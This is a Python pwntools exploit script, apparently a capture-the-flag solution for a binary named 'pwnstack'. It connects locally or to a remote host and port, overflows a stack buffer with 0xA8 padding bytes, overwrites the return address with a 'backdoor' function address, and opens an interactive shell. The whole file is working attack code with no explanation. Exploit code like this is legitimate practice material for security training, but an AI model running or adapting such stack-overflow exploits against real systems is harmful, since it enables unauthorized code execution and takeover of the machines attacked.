from pwn import *

s = lambda data: io.send(data)
sa = lambda delim, data: io.sendafter(str(delim), data)
sl = lambda data: io.sendline(data)
sla = lambda delim, data: io.sendlineafter(str(delim), data)
r = lambda num: io.recv(num)
ru = lambda delims, drop=True: io.recvuntil(delims, drop)
itr = lambda: io.interactive()
uu32 = lambda data: u32(data.ljust(4, b'\x00'))
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
context.log_level = 'debug'
context.binary = binary = './pwnstack'
gdbscript = '''
'''


def start(argv=[], *a, **kw):
    if args.GDB:
        proc = process([binary] + argv, *a, **kw)
        gdb.attach(proc, gdbscript=gdbscript)
        return proc
    elif args.REMOTE:
        return remote('10.5.101.125', 28015)
    else:
        return process([binary] + argv, *a, **kw)


backdoor = 0x0000000000400763
elf = ELF(binary)
io = start()
ru("this is pwn1,can you do that??")
pay = b'a' * (0xA8) + p64(backdoor)
sl(pay)
itr()
